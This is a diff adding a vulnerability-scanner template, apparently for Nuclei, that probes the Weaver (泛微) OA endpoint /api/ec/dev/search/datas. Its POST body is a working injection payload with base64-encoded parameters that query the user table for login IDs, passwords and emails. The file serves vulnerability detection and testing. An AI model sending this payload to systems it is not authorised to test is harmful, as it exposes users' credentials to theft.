@@ -1,0 +1,28 @@
+id: poc-yaml-weaver-api-ec-dev-search-datas-information-leak
+info:
+  name: 泛微OA api-ec-dev-search-datas 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an information leakage vulnerability in the 泛微OA API endpoint `/api/ec/dev/search/datas`.
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/ec/dev/search/datas"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |-
+      type=&sqlParams={"tFields":"Kg==","tFrom":"SHJtUmVzb3VyY2U=","tOrder":"aWQ=","tWhere":""}&columns=[{"dataIndex":"loginid"},{"dataIndex":"password"},{"dataIndex":"email"},{"dataIndex":"id"}]&sumCloumns=&min=0&max=100
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "passwordspan"
+          - "password"
+          - "datas"
